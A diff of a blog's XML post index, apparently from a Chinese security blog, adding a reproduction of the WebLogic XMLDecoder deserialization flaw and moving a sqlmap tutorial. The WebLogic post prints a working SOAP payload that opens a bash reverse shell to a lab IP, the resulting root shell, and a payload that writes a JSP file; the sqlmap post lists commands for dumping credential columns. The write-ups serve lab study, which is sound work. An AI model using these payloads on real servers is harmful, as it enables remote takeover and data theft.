@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>weblogic XMLDecoder反序列化漏洞复现</title>
+      <link href="/2019/07/26/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-fu-xian/"/>
+      <url>/2019/07/26/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-fu-xian/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传进来的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。<br>影响版本</p><pre><code>10.3.6.0.012.1.3.0.012.2.1.1.012.2.1.2.0</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>此漏洞出现在wls-wsat.war中，此组件使用了weblogic自带的webservices处理程序来处理SOAP请求在weblogic.wsee.jaxws.workcontext.WorkContextServerTube类中获取XML数据最终传递给XMLDecoder来解析，其解析XML的调用栈为</p><pre><code>weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequestweblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOldweblogic.wsee.workarea.WorkContextXmlInputAdapter</code></pre><p>归根结底，还是weblogic犯了编码上的错误，完全信任用户的输入，然后调用XMLDecoder进行反序列,导致了这个漏洞的发生。</p><h2 id="反弹shell的一些介绍"><a href="#反弹shell的一些介绍" class="headerlink" title="反弹shell的一些介绍"></a>反弹shell的一些介绍</h2><pre><code>一条反弹shell：bash -i &gt;&amp; /dev/tcp/192.168.75.131/8888 0&gt;&amp;1bash -i表示在本地打开一个bash/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接&gt;&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出0&gt;&amp;1代表将标准输入重定向到标准输出</code></pre><pre><code>0 - stdin 代表标准输入，使用&lt;或&lt;&lt;1 - stdout 代表标准输出，使用&gt;或&gt;&gt;2 - stdeer 代表标准错误输出，使用2&gt;或2&gt;&gt;</code></pre><p>还有&gt;&amp;这个符号的含义，最好的理解时这样的</p><pre><code>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向到文件当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向到后面的文件描述符</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>在burp发送如下数据包，要添加的除了下面的内容，还有Content-Type: text/xml<br>我们添加的post的内容是webservices调用服务器端的数据时要用到的，是用java写的，里面有反弹语句</p><pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.75.131:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Connection: closeCookie: JSESSIONID=5fwbd6hTQh2kC3xfcYjm0p1rGMwXxBftYcy2pqD1y6hLTD2hq7BQ!915002489; ADMINCONSOLESESSION=ZNlTd6jKfcTSvR5zkn1T1TMDfp4fXMWWLvttnhq2XLTNQLy14TGP!-1609868016Upgrade-Insecure-Requests: 1Content-Type: text/xml&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.75.131/8888 0&amp;gt;&amp;amp;1&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;</code></pre><p>发送到repeater里去，然后go，返回500，说明成功post<br>也能成功反弹shell</p><pre><code>dvsx@ubuntu:~$ nc -lvp 8888Listening on [0.0.0.0] (family 0, port 8888)Connection from 172.19.0.2 59154 received!bash: cannot set terminal process group (1): Inappropriate ioctl for devicebash: no job control in this shellroot@964c89dcfe79:~/Oracle/Middleware/user_projects/domains/base_domain# whoami&lt;Middleware/user_projects/domains/base_domain# whoami                        rootroot@964c89dcfe79:~/Oracle/Middleware/user_projects/domains/base_domain# </code></pre><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p>同样的，post</p><pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;    &lt;soapenv:Header&gt;    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;    &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;    &lt;object class=&quot;java.io.PrintWriter&quot;&gt;     &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/ptest.js&lt;/string&gt;    &lt;void method=&quot;println&quot;&gt;&lt;string&gt;    &lt;![CDATA[&lt;% out.print(&quot;test&quot;); %&gt;    ]]&gt;    &lt;/string&gt;    &lt;/void&gt;    &lt;void method=&quot;close&quot;/&gt;    &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;    &lt;/work:WorkContext&gt;    &lt;/soapenv:Header&gt;    &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;</code></pre><p>然后访问<a href="http://your-ip:7001/bea_wls_internal/test.jsp" target="_blank" rel="noopener">http://your-ip:7001/bea_wls_internal/test.jsp</a><br><img src="/2019/07/26/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-fu-xian/1.PNG" alt=""></p><p>参考文章<br><a href="https://www.anquanke.com/post/id/92003" target="_blank" rel="noopener">https://www.anquanke.com/post/id/92003</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>weblogic weak_password复现</title>
       <link href="/2019/07/25/weblogic-weak-password-fu-xian/"/>
       <url>/2019/07/25/weblogic-weak-password-fu-xian/</url>
@@ -346,25 +365,6 @@
     
     
     <entry>
-      <title>sqlmap使用详解</title>
-      <link href="/2019/04/22/sqlmap-shi-yong-xiang-jie/"/>
-      <url>/2019/04/22/sqlmap-shi-yong-xiang-jie/</url>
-      
-        <content type="html"><![CDATA[<h1 id="sqlmap使用详解"><a href="#sqlmap使用详解" class="headerlink" title="sqlmap使用详解"></a>sqlmap使用详解</h1><h2 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h2><p>sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。<br>sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测</p><h2 id="sqlmap基本用法"><a href="#sqlmap基本用法" class="headerlink" title="sqlmap基本用法"></a>sqlmap基本用法</h2><p>sqlmap的使用是基于我们已经通过手工注入的方法简单判断出注入类型，然后我们通过不同的参数来制定不同的payload。<br>下面的是最简单的联合查询注入<br>列举数据库</p><pre><code>sqlmap.py -u &quot;注入地址&quot; --dbs</code></pre><p>列举库中的表名</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 --tables</code></pre><p>列举表的列名</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 -T 表名 --columns </code></pre><p>列举字段内容</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 -T 表名 -C &quot;id,username,password&quot; --dump(字段可以是自己想要的内容)</code></pre><h2 id="sqlmap-post注入"><a href="#sqlmap-post注入" class="headerlink" title="sqlmap post注入"></a>sqlmap post注入</h2><p>我们在使用post注入时，有时会出现请求遗漏而导致注入失败的情况。这里可以使用burpsuit结合sqlmap来进行post注入<br>步骤如下：</p><pre><code>1.浏览器打开目标网站2.配置burp代理3.点击提交表单的按钮4.这时候burp会拦截我们的post请求5.把post请求复制为txt文件,假设命名为666.txt，位置为：C:\Users\user\Desktop\666.txt6.运行sqlmap输入命令：sqlmap.py -r &quot;C:\Users\user\Desktop\666.txt&quot;之后会爆出数据库名，然后后面的操作就和基础注入类似了</code></pre><p>这时爆库，爆表等操作和上面的基础注入方类似，只是多了-p指定参数</p><h2 id="sqlmap-cookie注入"><a href="#sqlmap-cookie注入" class="headerlink" title="sqlmap cookie注入"></a>sqlmap cookie注入</h2><p>默认情况下，sqlmap只支持get/post类型的注入，但当使用–level参数且值大于等于2时，也会检查cookie里的参数</p><pre><code>sqlmap.py -u 注入点URL --cookie&quot;id=xx&quot; --level 3sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 --tables(猜表名)sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 -T 表名 --columnssqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 -T 表名 -C username，password --dump</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上是sqlmap常用的操作，其实sqlmap支持的参数也特别多，我们需要掌握一些常见的参数，详情参见<a href="https://blog.csdn.net/breeze_cat/article/details/80628392" target="_blank" rel="noopener">https://blog.csdn.net/breeze_cat/article/details/80628392</a><br>实战练习：i春秋SQLi，攻防世界NewsCenter（用到–forms参数）</p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> 工具 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>DDCTF writeup</title>
       <link href="/2019/04/22/ddctf-writeup/"/>
       <url>/2019/04/22/ddctf-writeup/</url>
@@ -376,6 +376,25 @@
         <tags>
             
             <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sqlmap使用详解</title>
+      <link href="/2019/04/22/sqlmap-shi-yong-xiang-jie/"/>
+      <url>/2019/04/22/sqlmap-shi-yong-xiang-jie/</url>
+      
+        <content type="html"><![CDATA[<h1 id="sqlmap使用详解"><a href="#sqlmap使用详解" class="headerlink" title="sqlmap使用详解"></a>sqlmap使用详解</h1><h2 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h2><p>sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。<br>sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测</p><h2 id="sqlmap基本用法"><a href="#sqlmap基本用法" class="headerlink" title="sqlmap基本用法"></a>sqlmap基本用法</h2><p>sqlmap的使用是基于我们已经通过手工注入的方法简单判断出注入类型，然后我们通过不同的参数来制定不同的payload。<br>下面的是最简单的联合查询注入<br>列举数据库</p><pre><code>sqlmap.py -u &quot;注入地址&quot; --dbs</code></pre><p>列举库中的表名</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 --tables</code></pre><p>列举表的列名</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 -T 表名 --columns </code></pre><p>列举字段内容</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 -T 表名 -C &quot;id,username,password&quot; --dump(字段可以是自己想要的内容)</code></pre><h2 id="sqlmap-post注入"><a href="#sqlmap-post注入" class="headerlink" title="sqlmap post注入"></a>sqlmap post注入</h2><p>我们在使用post注入时，有时会出现请求遗漏而导致注入失败的情况。这里可以使用burpsuit结合sqlmap来进行post注入<br>步骤如下：</p><pre><code>1.浏览器打开目标网站2.配置burp代理3.点击提交表单的按钮4.这时候burp会拦截我们的post请求5.把post请求复制为txt文件,假设命名为666.txt，位置为：C:\Users\user\Desktop\666.txt6.运行sqlmap输入命令：sqlmap.py -r &quot;C:\Users\user\Desktop\666.txt&quot;之后会爆出数据库名，然后后面的操作就和基础注入类似了</code></pre><p>这时爆库，爆表等操作和上面的基础注入方类似，只是多了-p指定参数</p><h2 id="sqlmap-cookie注入"><a href="#sqlmap-cookie注入" class="headerlink" title="sqlmap cookie注入"></a>sqlmap cookie注入</h2><p>默认情况下，sqlmap只支持get/post类型的注入，但当使用–level参数且值大于等于2时，也会检查cookie里的参数</p><pre><code>sqlmap.py -u 注入点URL --cookie&quot;id=xx&quot; --level 3sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 --tables(猜表名)sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 -T 表名 --columnssqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 -T 表名 -C username，password --dump</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上是sqlmap常用的操作，其实sqlmap支持的参数也特别多，我们需要掌握一些常见的参数，详情参见<a href="https://blog.csdn.net/breeze_cat/article/details/80628392" target="_blank" rel="noopener">https://blog.csdn.net/breeze_cat/article/details/80628392</a><br>实战练习：i春秋SQLi，攻防世界NewsCenter（用到–forms参数）</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
             
         </tags>
       
